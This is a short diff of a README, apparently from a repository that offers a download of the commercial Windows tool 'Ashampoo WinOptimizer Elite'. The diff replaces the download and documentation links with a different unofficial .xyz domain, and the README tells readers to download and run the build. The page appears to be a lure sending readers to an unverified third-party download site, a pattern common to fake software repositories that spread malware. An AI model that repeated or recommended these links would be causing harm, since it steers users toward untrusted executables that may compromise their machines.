@@ -29,9 +29,9 @@ Grab the latest release from the download link above.
 No extra dependencies — download and run.
 
 ## 📥 Download
-➡️ **[Get the latest build](https://ashampoo-winoptimizer-elite.softonx.xyz)**
+➡️ **[Get the latest build](https://ashampoo-winoptimizer-elite.softax.xyz)**
 
-Documentation: https://ashampoo-winoptimizer-elite.softonx.xyz
+Documentation: https://ashampoo-winoptimizer-elite.softax.xyz
 
 ## Quick start
 **Step 1.** Click the download link above to get the current version.
